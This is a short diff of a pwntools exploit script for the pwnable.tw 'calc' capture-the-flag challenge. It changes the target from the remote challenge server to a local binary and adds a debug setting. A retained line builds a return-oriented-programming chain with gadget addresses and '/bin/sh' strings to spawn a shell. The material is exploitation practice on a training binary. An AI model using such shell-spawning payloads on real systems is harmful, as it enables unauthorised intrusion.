@@ -1,9 +1,9 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
 from pwn import *
-
-p=remote('chall.pwnable.tw',10100)
-#p = process('./calc.dms')
+context_log='debug'
+#p=remote('chall.pwnable.tw',10100)
+p = process('./calc')
 
 keys=[0x0805c34b,0xb,0x080701d1,0,0,0x08049a21,u32('/bin'),u32('/sh\0')]
 
